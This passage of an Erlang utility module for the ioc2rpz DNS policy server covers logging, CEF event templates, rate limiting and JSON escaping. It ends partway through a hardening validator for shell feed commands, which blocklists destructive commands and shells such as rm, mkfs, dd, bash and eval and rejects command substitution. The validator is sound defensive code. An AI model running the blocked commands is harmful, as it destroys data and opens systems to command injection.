%Copyright 2017-2021 Vadim Pavlov ioc2rpz[at]gmail[.]com
%
%Licensed under the Apache License, Version 2.0 (the "License");
%you may not use this file except in compliance with the License.
%You may obtain a copy of the License at
%
%    http://www.apache.org/licenses/LICENSE-2.0
%
%Unless required by applicable law or agreed to in writing, software
%distributed under the License is distributed on an "AS IS" BASIS,
%WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
%See the License for the specific language governing permissions and
%limitations under the License.

%IOC2RPZ Functions

-module(ioc2rpz_fun).
-include_lib("eunit/include/eunit.hrl").
-include_lib("ioc2rpz.hrl").
-export([logMessage/2,logMessageCEF/2,strs_to_binary/1,curr_serial/0,curr_serial_60/0,constr_ixfr_url/3,ip_to_bin/1,read_local_actions/1,split_bin_bytes/2,split_tail/2,rsplit_tail/2,
         bin_to_lowcase/1,ip_in_list/2,intersection/2,bin_to_hexstr/1,conv_to_Mb/1,q_class/1,q_type/1,split/2,msg_CEF/1,base64url_decode/1,get_cipher_suites/1,
         str_to_ip/1,check_rate_limit/1,check_rate_limit/2,cleanup_rate_limit_table/0,constant_time_compare/2,json_escape/1,validate_shell_cmd/1,
         mask_new/0,mask_new/1,mask_set/2,mask_or/2,mask_bits/1,mask_from_indices/1,mask_from_indices/2,
         mask_to_bitmap/1,mask_to_integer/1,mask_repr_for/1,mask_is_empty/1]).

%% @doc Logs a formatted message to the group leader with a timestamp prefix.
%% Delegates to {@link logMessage/3} using `group_leader()' as the destination.
%% @param Message An `io:format/2' format string.
%% @param Vars A list of arguments for the format string.
-spec logMessage(string(), list()) -> ok.
logMessage(Message, Vars) ->
  logMessage(group_leader(), Message, Vars).

%% @doc Logs a formatted message to the specified IO destination with a timestamp prefix.
%% @param Dest The IO device to write to (e.g., `group_leader()').
%% @param Message An `io:format/2' format string.
%% @param Vars A list of arguments for the format string.
-spec logMessage(pid() | atom(), string(), list()) -> ok.
logMessage(Dest, Message, Vars) ->
 ?addTS(Dest),
 safe_fwrite(Dest,Message,Vars).


%% @doc Logs a CEF (Common Event Format) message to the group leader.
%% The caller must supply the CEF fields from "Device Event Class ID" onward:
%% `"Device Event Class ID|Name|Severity|[Extension]"'.
%% The CEF header (Version, Vendor, Product, Device Version) is prepended automatically.
%% @param Message A format string for the CEF payload (starting with `|').
%% @param Vars A list of arguments for the format string.
%% @see msg_CEF/1
logMessageCEF(Message, Vars) -> % "Device Event Class ID|Name|Severity|[Extension]" must be passed
  logMessageCEF(group_leader(), Message, Vars).

logMessageCEF(Dest, Message, Vars) ->
 ?addTS(Dest),
 safe_fwrite(Dest,"CEF:0|ioc2rpz|ioc2rpz|~s"++Message,[?ioc2rpz_ver|Vars]).

%% @doc Writes a formatted log line, but never lets a logging error crash the
%% calling process. A format string / argument-count mismatch (or any other
%% formatting error) would otherwise make `io:fwrite/3' raise `badarg', which
%% for a DNS/AXFR worker gen_server means the whole connection is torn down and
%% a crash report is emitted. Here such errors are caught and replaced by a
%% best-effort fallback line that preserves the original format and arguments so
%% the underlying bug is still visible in the logs.
%% @param Dest    The IO device to write to.
%% @param Message The format string.
%% @param Vars    The list of format arguments.
%% @returns `ok'.
safe_fwrite(Dest, Message, Vars) ->
  try
    io:fwrite(Dest, Message, Vars)
  catch
    Class:Reason ->
      catch io:fwrite(Dest,
        "ioc2rpz logging error (~p:~p) - bad format/args. format=~p args=~p~n",
        [Class, Reason, Message, Vars]),
      ok
  end.

%CEF:Version|Device Vendor|Device Product|Device Version|Device Event Class ID|Name|Severity|[Extension]
% Severity is a string or integer and reflects the importance of the event. The valid string values are Unknown, Low, Medium, High, and Very-High. The valid integer values are 0-3=Low, 4-6=Medium, 7- 8=High, and 9-10=Very-High.

%% @doc Returns a CEF format string template for the given event class ID.
%%
%% Each clause maps a numeric event code to a CEF-formatted string containing
%% pipe-delimited fields: `"|ClassID|Name|Severity|Extension\n"'.
%% The returned string is suitable for use with `io:fwrite/2' or `io_lib:format/2'.
%%
%% Event code ranges:
%% <ul>
%%   <li>101–109: DNS protocol events (bad packet, refused, TSIG errors)</li>
%%   <li>120–121: RPZ lookup events (not found, not ready)</li>
%%   <li>130–131: RPZ transfer events (error, remote close).
%%       <b>Note:</b> codes 130/131 have duplicate clauses — the second set
%%       (REST API auth) is currently unreachable dead code (see bugfix task 29).</li>
%%   <li>135–138: REST/MGMT events (denied, failed, unsupported, zone not found)</li>
%%   <li>201–202: Success events (RPZ transfer, DNS query)</li>
%%   <li>221–222: DNS Notify events</li>
%%   <li>230, 301: Management request events</li>
%%   <li>429: Rate limiting</li>
%%   <li>501: DDoS detection (CVE-2004-0789)</li>
%% </ul>
%%
%% @param Code An integer event class ID.
%% @returns A CEF format string, or `"Not defined\n"' for unknown codes.
-spec msg_CEF(integer()) -> string().
msg_CEF(101)    -> "|000101|Bad DNS packet|3|src=~s spt=~p proto=~p~n";
msg_CEF(102)    -> "|000102|Bad DNS request|3|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p~n";
msg_CEF(103)    -> "|000103|Refused|5|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p tsigkey=~p msg=~p~n";
msg_CEF(104)    -> "|000104|TSIG key not found|5|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p tsigkey=~p msg=~p~n";
msg_CEF(105)    -> "|000105|TSIG Bad MAC|5|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p tsigkey=~p msg=~p~n";
msg_CEF(106)    -> "|000106|TSIG Bad time|5|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p tsigkey=~p msg=~p~n";
msg_CEF(107)    -> "|000107|Other TSIG error|5|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p tsigkey=~p msg=~p msg2=~p~n";
msg_CEF(108)    -> "|000108|Wrong TSIG position|5|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p tsigkey=~p msg=~p~n";
msg_CEF(109)    -> "|000109|Received DNS response|3|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p~n";

msg_CEF(120)    -> "|000120|RPZ not found|5|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p tsigkey=~p msg=~p~n";
msg_CEF(121)    -> "|000121|RPZ not ready|3|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p tsigkey=~p msg=~p~n";

msg_CEF(130)    -> "|000130|RPZ transfer error|3|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p  tsigkey=~p transfer_time=~p error=~p~n";
msg_CEF(131)    -> "|000131|RPZ transfer error. Remote server closed connection|3|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p  tsigkey=~p transfer_time=~p reason=~p~n";


msg_CEF(140)    -> "|000140|REST API Basic authentication failed|7|src=~s spt=~p username=~p path=~p msg=~p~n";
msg_CEF(141)    -> "|000141|REST API Authentication failed|7|src=~s spt=~p path=~p msg=~p~n";
msg_CEF(145)    -> "|000145|REST MGMT request denied|7|src=~s spt=~p path=~p msg=~p~n";
msg_CEF(146)    -> "|000146|MGMT request failed|7|src=~s spt=~p path=~p msg=~p~n";
msg_CEF(147)    -> "|000147|Unsupported request|7|src=~s spt=~p path=~p msg=~p~n";
msg_CEF(148)    -> "|000148|Zone not found|7|src=~s spt=~p path=~p msg=~p~n";

msg_CEF(201)    -> "|000201|RPZ transfer success|3|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p  tsigkey=~p transfer_time=~p~n";
msg_CEF(202)    -> "|000202|DNS Query|3|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p tsigkey=~p~n";

msg_CEF(230)    -> "|000230|MGMT request|7|src=~s spt=~p path=~p msg=~p~n";

msg_CEF(221)    -> "|000221|DNS Notify|3|dst=~s dpt=~p proto=~p zone=~p~n";
msg_CEF(222)    -> "|000222|DNS Notify error|5|dst=~s dpt=~s proto=~s zone=~p msg=~p~n";

msg_CEF(301)    -> "|000301|MGMT request denied|7|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p tsigkey=~p msg=~p~n";

msg_CEF(429)    -> "|000429|Too many requests|7|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p~n";

msg_CEF(501)    -> "|000501|Possible DDoS CVE-2004-0789|37|src=~s spt=~p proto=~p~n";

msg_CEF(150)    -> "|000150|Shell source command executed|3|cmd=~s~n";
msg_CEF(151)    -> "|000151|Shell source command rejected|7|cmd=~s reason=~p~n";

msg_CEF(_)    -> "Not defined~n".

%% @doc Converts a list of strings to a flattened list of binaries.
%% @param Strs A list of string values.
%% @returns A flattened list of binaries.
strs_to_binary(Strs) ->
  strs_to_binary(Strs,[]).

strs_to_binary([Head|Tail],Result) ->
  Bin = list_to_binary(Head),
  strs_to_binary(Tail,[Result,Bin]);
strs_to_binary([],Result) ->
  lists:flatten(Result).


%% @doc Returns the current UNIX timestamp in seconds.
%% Used as the serial number for DNS zone SOA records.
%% @returns An integer representing seconds since the UNIX epoch.
-spec curr_serial() -> non_neg_integer().
curr_serial() ->
  erlang:system_time(seconds).

%% @doc Returns the current UNIX timestamp rounded down to the nearest minute.
%% The minute-resolution serial is used to cache IXFR responses so that
%% multiple requests within the same minute share the same serial.
%% @returns An integer representing seconds since the UNIX epoch, truncated to 60s.
-spec curr_serial_60() -> non_neg_integer().
curr_serial_60() -> %Current serial has a minute resolution to cache IXFR
  CTime=erlang:system_time(seconds),
  CTime - CTime rem 60.



%% @doc Constructs an IXFR URL by substituting timestamp placeholders.
%% Replaces `"[:FTimestamp:]"' and `"[:ToTimestamp:]"' tokens in the URL
%% template with the given `FromTime' and `ToTime' integer values.
%% @param IUrl A tokenized URL (list of strings with possible placeholder tokens).
%% @param FromTime The start timestamp (integer seconds).
%% @param ToTime The end timestamp (integer seconds).
%% @returns The assembled URL string with timestamps substituted.
constr_ixfr_url(IUrl,FromTime,ToTime) ->
  constr_ixfr_url(IUrl,FromTime,ToTime,[]).

constr_ixfr_url(["[:FTimestamp:]"|IUrl],FromTime,ToTime,Url) ->
  constr_ixfr_url(IUrl,FromTime,ToTime,Url++integer_to_list(FromTime));

constr_ixfr_url(["[:ToTimestamp:]"|IUrl],FromTime,ToTime,Url) ->
  constr_ixfr_url(IUrl,FromTime,ToTime,Url++integer_to_list(ToTime));

constr_ixfr_url([A|IUrl],FromTime,ToTime,Url) ->
  constr_ixfr_url(IUrl,FromTime,ToTime,Url++A);

constr_ixfr_url([],_FromTime,_ToTime,Url) ->
  Url.

%The function split a binary by a pattern. Is not faster then binary:split. Consider to remove or do predifined pattern.
z_split(Bin,Pattern) when is_binary(Bin),is_binary(Pattern) ->
  z_split(Bin, 0, Pattern).
z_split(Bin,N, Pattern) ->
  case Bin of
    <<_:N/binary,Pattern:1/binary,_/binary>> ->
      <<B1:N/binary,Pattern:1/binary,B2/binary>> = Bin,
      [B1,B2];
    <<_:N/binary>> ->
      [Bin];
    _ ->
      z_split(Bin, N+1,Pattern)
  end.

%% @doc Converts an IP address string to a 4-byte (IPv4) or 16-byte (IPv6) binary.
%% Accepts a string like `"10.10.10.10"' or `"fc00::01"' and returns the
%% packed binary representation suitable for DNS wire format.
%% @param IP A string representation of an IPv4 or IPv6 address.
%% @returns A binary: 4 bytes for IPv4, 16 bytes for IPv6.
ip_to_bin(IP) when is_list(IP)->
  ip_to_bin(inet:parse_address(IP));

ip_to_bin({ok,{IP1,IP2,IP3,IP4}}) ->
  <<IP1,IP2,IP3,IP4>>;

ip_to_bin({ok,{IP1,IP2,IP3,IP4,IP5,IP6,IP7,IP8}}) ->
  <<IP1:16,IP2:16,IP3:16,IP4:16,IP5:16,IP6:16,IP7:16,IP8:16>>.

%% @doc Parses an IP address string into an `inet:ip_address()' tuple.
%% @param IPStr A string representation of an IPv4 or IPv6 address.
%% @returns An `inet:ip_address()' tuple (e.g., `{10,10,10,10}').
str_to_ip(IPStr)->
  %TODO Error handling
  {ok,IP}= inet:parse_address(IPStr),
  IP.

%% @doc Parses RPZ local action definitions into binary form.
%% Converts action tuples from the configuration file into internal binary
%% representations used for RPZ response generation.
%%
%% Supported actions:
%% <ul>
%%   <li>`"local_a"' / `"local_aaaa"' — IP address converted via {@link ip_to_bin/1}</li>
%%   <li>`"local_cname"' — domain split on `"."' into label list</li>
%%   <li>`"local_txt"' — text prefixed with its byte length</li>
%% </ul>
%% @param Actions A list of `{ActionType, Data}' tuples from configuration.
%% @returns A list of `{BinaryAction, BinaryData}' tuples.
read_local_actions(Actions) ->
 read_local_actions(Actions,[]).

read_local_actions([{Act,LData}|REST],Acc) when Act=="local_a";Act=="local_aaaa" ->
 read_local_actions(REST,[{list_to_binary(Act),ioc2rpz_fun:ip_to_bin(LData)}|Acc]);

read_local_actions([{Act,LData}|REST],Acc) when Act=="local_cname" ->
 read_local_actions(REST,[{list_to_binary(Act),binary:split(list_to_binary(LData),<<".">>,[global])}|Acc]);

read_local_actions([{Act,LData}|REST],Acc) when Act=="local_txt" ->
 LocD=list_to_binary(LData),
 read_local_actions(REST,[{list_to_binary(Act),<<(byte_size(LocD)),LocD/binary>>}|Acc]);


read_local_actions([],Acc) ->
 Acc.


%% @doc Splits a binary into chunks of the given byte size.
%% The last chunk may be smaller than `Size' if the binary length is not
%% evenly divisible. Returns an empty list for an empty binary.
%% @param Bin The binary to split.
%% @param Size The maximum chunk size in bytes (must be &gt; 0).
%% @returns A list of binary chunks.
split_bin_bytes(Bin, Size) when byte_size(Bin) >= Size, Size>0 ->
    {Chunk, Rest} = split_binary(Bin, Size),
    [Chunk|split_bin_bytes(Rest, Size)];
split_bin_bytes(<<>>,_Size) ->
    [];
split_bin_bytes(Bin,_Size)  ->
    [Bin].


%% @doc Splits a binary string on a pattern, returning segments in order.
%% Wrapper around `binary:split/3' with the `global' option.
%% @param String The binary to split.
%% @param Pattern The delimiter pattern (binary or list of binaries).
%% @returns A list of binary segments.
split_tail(String, Pattern) ->
 binary:split(String,Pattern,[global]). %[<<"\r\n">>,<<"\n">>,<<"\r">>]

%% @doc Splits a binary string on a pattern, returning segments in reverse order.
%% @param String The binary to split.
%% @param Pattern The delimiter pattern.
%% @returns A reversed list of binary segments.
rsplit_tail(String, Pattern) ->
 lists:reverse(split_tail(String, Pattern)).

% Old split_tail/rsplit_tail slow, to remove 2020-08-05
%split_tail(String, Pattern) ->
%%  ioc2rpz_fun:logMessage("z_split ~p ~p ~n",[String, Pattern]),
%	case binary:split(String, Pattern) of %binary:split
%		[First, Second] -> [First | split_tail(Second, Pattern)];
%		[First] -> [First];
%		[] -> []
%	end.

%rsplit_tail(String, Pattern) ->
%%  ioc2rpz_fun:logMessage("z_split ~p ~p ~n",[String, Pattern]),
%	case binary:split(String, Pattern) of %binary:split
%		[First, Second] -> rsplit_tail(Second, Pattern) ++ [First];
%		[First] -> [First];
%		[] -> []
%	end.

%%% bin_to_lowcase
%%% 2025-01-10 Remove blow after validation of the optimization
%% @doc Converts all uppercase ASCII characters (A–Z) in a binary to lowercase.
%% Non-ASCII bytes and already-lowercase bytes are passed through unchanged.
%% @param A A binary string.
%% @returns A new binary with all ASCII uppercase letters lowercased.
-spec bin_to_lowcase(binary()) -> binary().
bin_to_lowcase(A) ->
 << << (b_to_lowcase(C)) >> || << C >> <= A >>.
b_to_lowcase(A) when A>=65,A=<90 ->
 A+32;
b_to_lowcase(A) ->
 A.
%%% End bin_to_lowcase

%% @doc Checks whether an IP address is a member of the given access control list.
%% Currently performs a simple `lists:member/2' lookup.
%% @param IP The IP address tuple to check (e.g., `{10,0,0,1}').
%% @param LST A list of allowed IP address tuples.
%% @returns `true' if `IP' is in `LST', `false' otherwise.
%% @todo Add CIDR prefix matching support.
-spec ip_in_list(inet:ip_address(), [inet:ip_address()]) -> boolean().
ip_in_list(IP,LST) -> %TODO check CIDR as well
 lists:member(IP,LST).

%% @doc Returns the intersection of two lists.
%% @param L1 First list.
%% @param L2 Second list.
%% @returns A list of elements present in both `L1' and `L2'.
intersection(L1,L2) -> lists:filter(fun(X) -> lists:member(X,L1) end, L2).

%% @doc Converts a 128-bit binary (e.g., an MD5 hash) to a lowercase hex string.
%% @param Bin A 128-bit (16-byte) binary value.
%% @returns A 32-character lowercase hexadecimal string.
-spec bin_to_hexstr(<<_:128>>) -> string().
bin_to_hexstr(<<Bin:128/big-unsigned-integer>>) ->
 lists:flatten(io_lib:format("~32.16.0b", [Bin])).


%conv_to_Mb(M) ->
%  list_to_binary(case M of
%    M when M > 1024*1024*1024 -> [integer_to_list(M div 1024*1024*1024), "/Gb"];
%    M when M > 1024*1024 -> [integer_to_list(M div (1024*1024)),"/Mb"];
%    M when M > 1024 -> [integer_to_list(M div 1024),"/Kb"];
%    M -> [integer_to_list(M),"/bytes"]
%  end).


%% @doc Converts a byte size into a human-readable string with unit suffix.
%% Values below 1024 are returned as `"N/bytes"'. Larger values are scaled
%% to KB, MB, GB, TB, or PB with two decimal places.
%% @param Size A non-negative integer byte count.
%% @returns A binary like `<<"42/bytes">>' or `<<"1.50/KB">>'.
conv_to_Mb(Size) when Size >= 1024 -> conv_to_Mb(Size, ["B","KB","MB","GB","TB","PB"]);

conv_to_Mb(Size) ->
 list_to_binary([integer_to_list(Size),"/bytes"]).

conv_to_Mb(S, [_|[_|_] = L]) when S >= 1024 -> conv_to_Mb(S/1024, L);
conv_to_Mb(S, [M|_]) ->
    list_to_binary(io_lib:format("~.2f/~s", [float(S), M])).


%% @doc Returns the human-readable string for a DNS query class code.
%% Maps well-known class constants (`?C_IN', `?C_CHAOS', `?C_ANY') to their
%% string names. Unknown classes are returned as their integer string form.
%% @param QClass An integer DNS class code.
%% @returns A string such as `"IN"', `"CHAOS"', `"ANY"', or the numeric string.
q_class(?C_IN)    -> "IN";
q_class(?C_CHAOS) -> "CHAOS";
q_class(?C_ANY)   -> "ANY";
q_class(QClass)   -> integer_to_list(QClass).

%% @doc Returns the human-readable string for a DNS query type code.
%% Maps well-known type constants (`?T_A', `?T_AAAA', `?T_SOA', `?T_AXFR', etc.)
%% to their string names. Unknown types are returned as their integer string form.
%% @param QType An integer DNS type code.
%% @returns A string such as `"A"', `"AAAA"', `"SOA"', or the numeric string.
q_type(?T_A)      -> "A";
q_type(?T_NS)     -> "NS";
q_type(?T_CNAME)  -> "CNAME";
q_type(?T_SOA)    -> "SOA";
q_type(?T_TXT)    -> "TXT";
q_type(?T_AAAA)   -> "AAAA";
q_type(?T_OPT)    -> "OPT";
q_type(?T_IXFR)   -> "IXFR";
q_type(?T_AXFR)   -> "AXFR";
q_type(?T_ANY)    -> "ANY";
q_type(?RT_TSIG)  -> "TSIG";
q_type(QType)     -> integer_to_list(QType).


% 1.17
% Split a list into two parts; the length of the first part is given.
% usage: p99:split(List,Length)
% example:
% p99:split([a,b,c],2). =>  [[a,b],[c]]
% p99:split([a,b,c],1). =>  [[a],[b,c]]

%% @doc Splits a list into two parts at the given index.
%% Returns a list of two sublists: the first `Index' elements and the remainder.
%% @param List The input list.
%% @param Index The number of elements in the first part (must be &gt; 0).
%% @returns `[FirstPart, SecondPart]' where `length(FirstPart) =:= Index'.
split([],_)->
    [];
split([H|T],Index) when Index>0,T==[] ->
    [[H],T];
split([H|T],1)->
    [[H],T];
split([H|T],Index)->
    [RH,RT]=split(T,Index-1),
    [[H|RH],RT].



%% @doc Decodes a base64url-encoded binary (RFC 4648 §5) to plain binary.
%% Replaces URL-safe characters (`-' → `+', `_' → `/') and adds padding
%% as needed before decoding. Returns `{ok, Binary}' on success or
%% `{error, <<>>}' if decoding fails.
%% @param Str A base64url-encoded binary.
%% @returns `{ok, DecodedBinary}' | `{error, <<>>}'.
base64url_decode(Str) ->
	StrURL=binary:replace(binary:replace(Str,<<"-">>,<<"+">>,[global]),<<"_">>,<<"/">>,[global]),
	Pad = case byte_size(StrURL) rem 4 of
		0 -> <<>>;
		1 -> <<>>;
		3 -> <<"=">>;
		2 -> <<"==">>
	end,
	try {ok, base64:decode(<<StrURL/binary, Pad/binary>>)}
	catch
			throw: _Term -> {error,<<>>};
			exit: _Reason -> {error,<<>>};
			error: _Reason:_Stk -> {error,<<>>}
	end.


%% @doc Returns the SSL cipher suites for the given TLS version.
%%
%% Behavior:
%% <ul>
%%   <li>`'tlsv1.2-1.3'' — combined TLS 1.2 default + TLS 1.3 exclusive suites</li>
%%   <li>a recognized single version atom (`'tlsv1.2'', `'tlsv1.3'', `'tlsv1.1'',
%%       `'dtlsv1.2'') — that version's default suites</li>
%%   <li>any other value — logs a warning and falls back to the TLS 1.2 default
%%       suites (so a misconfigured version cannot crash listener startup)</li>
%% </ul>
%%
%% The version is matched/forwarded as an atom, which is what
%% `ssl:cipher_suites/2' expects.
%%
%% @param TLSVersion A TLS version atom (see `?TLSVersion').
%% @returns A list of cipher suite maps as returned by `ssl:cipher_suites/2'.
get_cipher_suites('tlsv1.2-1.3') ->
  TLS12=ssl:cipher_suites(default, 'tlsv1.2'),
  TLS13=ssl:cipher_suites(exclusive, 'tlsv1.3'),
  ssl:append_cipher_suites(TLS12,TLS13);

get_cipher_suites(TLSVersion) when TLSVersion=='tlsv1.2';TLSVersion=='tlsv1.3';TLSVersion=='tlsv1.1';TLSVersion=='dtlsv1.2' ->
  ssl:cipher_suites(default, TLSVersion);

get_cipher_suites(TLSVersion) ->
  logMessage("unsupported TLS version ~p, falling back to tlsv1.2~n", [TLSVersion]),
  ssl:cipher_suites(default, 'tlsv1.2').

%% @doc Checks whether a request identified by `Id' exceeds the rate limit.
%%
%% Uses the `?RATE_LIMIT_TABLE' ETS table to track request timestamps and
%% counts per identifier. Within a sliding window of `?RATE_LIMIT_WINDOW'
%% milliseconds, at most `?MAX_REQUESTS_PER_WINDOW' requests are allowed.
%%
%% If the window has expired, the counter is reset. If this is the first
%% request for the given `Id', a new entry is created.
%%
%% <b>Note:</b> Expired entries are never deleted by this function, which can
%% cause unbounded ETS table growth. See bugfix task 21 for the planned
%% periodic cleanup mechanism.
%%
%% @param Id The rate limit key. A 3-tuple `{IP, QName, QType}' selects the
%%        granular bucket (limited by `?MAX_REQUESTS_PER_WINDOW'); a 1-tuple
%%        `{IP}' selects the aggregate per-IP bucket (limited by
%%        `?MAX_UNKNOWN_REQUESTS_PER_WINDOW').
%% @returns `true' if the rate limit is exceeded, `false' otherwise.
-spec check_rate_limit(term()) -> boolean().
%%%Rate limiting function
check_rate_limit(Id) ->
  %% Pick the threshold by key shape: the aggregate per-IP bucket ({IP}) uses
  %% ?MAX_UNKNOWN_REQUESTS_PER_WINDOW, every other (granular) key uses
  %% ?MAX_REQUESTS_PER_WINDOW. See ioc2rpz:rl_key/5.
  Max = case Id of
          {_Rip} -> ?MAX_UNKNOWN_REQUESTS_PER_WINDOW;
          _      -> ?MAX_REQUESTS_PER_WINDOW
        end,
  check_rate_limit(Id, Max).

%% @doc Rate-limit check with an explicit per-window maximum.
%% @param Id The rate limit key.
%% @param Max The maximum number of requests allowed within `?RATE_LIMIT_WINDOW'.
%% @returns `true' if the rate limit is exceeded, `false' otherwise.
-spec check_rate_limit(term(), non_neg_integer()) -> boolean().
check_rate_limit(Id, Max) ->
  CurrentTime = erlang:system_time(millisecond),
  case ets:lookup(?RATE_LIMIT_TABLE, Id) of
      [{Id, {LastRequestTime, RequestCount}}] ->
          if CurrentTime - LastRequestTime < ?RATE_LIMIT_WINDOW ->
              if RequestCount >= Max ->
                  true; % Rate limit exceeded
              true ->
                  ets:insert(?RATE_LIMIT_TABLE, {Id, {CurrentTime, RequestCount + 1}}),
                  false % Rate limit not exceeded
              end;
          true ->
              ets:insert(?RATE_LIMIT_TABLE, {Id, {CurrentTime, 1}}), % Reset count if outside the window
              false
          end;
      [] ->
          ets:insert(?RATE_LIMIT_TABLE, {Id, {CurrentTime, 1}}), % First request from this IP
          false
  end.
%%%End rate limit function

%% @doc Removes expired entries from the rate-limit ETS table.
%%
%% Performs a periodic sweep of `?RATE_LIMIT_TABLE', deleting all entries
%% whose `LastRequestTime' is older than `?RATE_LIMIT_WINDOW' milliseconds
%% from the current time. This prevents unbounded table growth from
%% one-time clients that never return.
%%
%% Intended to be called via `timer:apply_interval/4' from the supervisor.
%% @returns `ok'.
-spec cleanup_rate_limit_table() -> ok.
cleanup_rate_limit_table() ->
  CurrentTime = erlang:system_time(millisecond),
  Cutoff = CurrentTime - ?RATE_LIMIT_WINDOW,
  %% Delete all entries where LastRequestTime =< Cutoff
  %% Match spec: match {Key, {LastRequestTime, _Count}} where LastRequestTime =< Cutoff
  ets:select_delete(?RATE_LIMIT_TABLE,
    [{{'_', {'$1', '_'}}, [{'=<', '$1', Cutoff}], [true]}]),
  ok.
%%%End rate limit cleanup

%% @doc Constant-time comparison of two binaries.
%% Returns `true' if both binaries are equal, `false' otherwise.
%% This function always compares all bytes (XOR-fold) to avoid timing side-channels.
%% @param A First binary.
%% @param B Second binary.
%% @returns `true' | `false'.
-spec constant_time_compare(binary(), binary()) -> boolean().
constant_time_compare(A, B) when is_binary(A), is_binary(B), byte_size(A) =:= byte_size(B) ->
  xor_fold(A, B, 0) =:= 0;
constant_time_compare(_, _) ->
  false.

%% @doc XOR-folds corresponding bytes of two equal-length binaries into an accumulator.
-spec xor_fold(binary(), binary(), non_neg_integer()) -> non_neg_integer().
xor_fold(<<>>, <<>>, Acc) ->
  Acc;
xor_fold(<<H1:8, T1/binary>>, <<H2:8, T2/binary>>, Acc) ->
  xor_fold(T1, T2, Acc bor (H1 bxor H2)).

%% @doc Escapes a string/binary for safe inclusion inside a JSON string literal.
%%
%% Escapes the characters that would otherwise break or inject into a JSON
%% document: double quote, backslash, and the C0 control characters
%% (`\b', `\t', `\n', `\f', `\r', and any remaining `< 0x20' as `\uXXXX').
%% Accepts a binary or a list of characters; always returns a flat list
%% (string) suitable for use with `~s'.
%%
%% @param Value A binary or string (list of code points) to escape.
%% @returns The escaped string (a flat list of characters).
-spec json_escape(binary() | string()) -> string().
json_escape(Value) when is_binary(Value) ->
  json_escape(unicode:characters_to_list(Value));
json_escape(Value) when is_list(Value) ->
  lists:flatten([ json_escape_char(C) || C <- Value ]).

%% @doc Escapes a single character for a JSON string literal.
json_escape_char($")  -> "\\\"";
json_escape_char($\\) -> "\\\\";
json_escape_char($\b) -> "\\b";
json_escape_char($\t) -> "\\t";
json_escape_char($\n) -> "\\n";
json_escape_char($\f) -> "\\f";
json_escape_char($\r) -> "\\r";
json_escape_char(C) when is_integer(C), C < 16#20 -> lists:flatten(io_lib:format("\\u~4.16.0b", [C]));
json_escape_char(C) -> C.

%% @doc Validates a `shell:' source command before it is passed to `os:cmd/1'.
%%
%% Security hardening (task 11). The command is split into pipeline segments on
%% unquoted `|' (quote-aware: a `|' or `\|' inside single/double quotes is not a
%% separator), and each segment's executable (first token) must be EITHER an
%% absolute path (starts with `/') OR the bare basename of a safe text-processing
%% utility on the allowlist. The basename of every executable (absolute or bare)
%% is additionally checked against a blocklist of destructive commands and
%% general-purpose shells, so the allowlist can never re-admit a blocked command.
%% Command substitution (backticks, `$(') and output redirection (unquoted `>'
%% / `>>') are rejected. Pipes, quotes, parentheses inside awk/sed expressions,
%% `&' inside quoted URLs, etc. are allowed since they are essential for real
%% feed pipelines.
%%
%% @param CMD The shell command binary (the part after the `shell:' prefix).
%% @returns `{ok, CMD}' if the command is allowed, or `{error, Reason}' otherwise.
-spec validate_shell_cmd(binary()) -> {ok, binary()} | {error, term()}.
validate_shell_cmd(CMD) when is_binary(CMD) ->
  case scan_shell_cmd(binary_to_list(CMD), none, [], []) of
    {error, Reason} -> {error, Reason};
    {ok, Segments}  ->
      case validate_shell_segments(Segments) of
        ok          -> {ok, CMD};
        {error, R}  -> {error, R}
      end
  end.

%% @doc Blocklist of destructive commands / shells, matched by basename.
shell_blocked_cmds() ->
  ["rm","mkfs","dd","chmod","chown","shutdown","reboot","kill","killall",
   "mv","eval","exec","source","bash","sh","zsh","csh","ksh"].

%% @doc Allowlist of safe text-processing utilities that may be invoked by bare
%% name (without an absolute path), matched by basename.
shell_safe_utils() ->
  ["sort","uniq","grep","egrep","fgrep","sed","awk","gawk","cut","tr",
   "head","tail","cat","comm","wc","tee"].

%% @doc Quote-aware scanner. Splits the command into pipeline segments on
%% unquoted `|' and rejects command substitution / output redirection.
%% State is `none' (unquoted), `single' (inside '...') or `double' (inside "...").
scan_shell_cmd([], none, CurSeg, Segs) ->
  {ok, lists:reverse([lists:reverse(CurSeg) | Segs])};
scan_shell_cmd([], _Quoted, _CurSeg, _Segs) ->
  {error, unbalanced_quotes};
%% --- inside single quotes: everything literal until the closing quote ---
scan_shell_cmd([$' | Rest], single, CurSeg, Segs) ->
  scan_shell_cmd(Rest, none, [$' | CurSeg], Segs);
scan_shell_cmd([C | Rest], single, CurSeg, Segs) ->
  scan_shell_cmd(Rest, single, [C | CurSeg], Segs);
%% --- inside double quotes: backslash escapes; subst rejected; quote ends ---
scan_shell_cmd([$\\, C | Rest], double, CurSeg, Segs) ->
  scan_shell_cmd(Rest, double, [C, $\\ | CurSeg], Segs);
scan_shell_cmd([$` | _Rest], double, _CurSeg, _Segs) ->
  {error, command_substitution};
scan_shell_cmd([$$, $( | _Rest], double, _CurSeg, _Segs) ->
  {error, command_substitution};
scan_shell_cmd([$" | Rest], double, CurSeg, Segs) ->
  scan_shell_cmd(Rest, none, [$" | CurSeg], Segs);
scan_shell_cmd([C | Rest], double, CurSeg, Segs) ->
  scan_shell_cmd(Rest, double, [C | CurSeg], Segs);
%% --- unquoted ---
scan_shell_cmd([$\\, C | Rest], none, CurSeg, Segs) ->
  scan_shell_cmd(Rest, none, [C, $\\ | CurSeg], Segs);
scan_shell_cmd([$\\], none, _CurSeg, _Segs) ->
  {error, trailing_backslash};
scan_shell_cmd([$' | Rest], none, CurSeg, Segs) ->
  scan_shell_cmd(Rest, single, [$' | CurSeg], Segs);
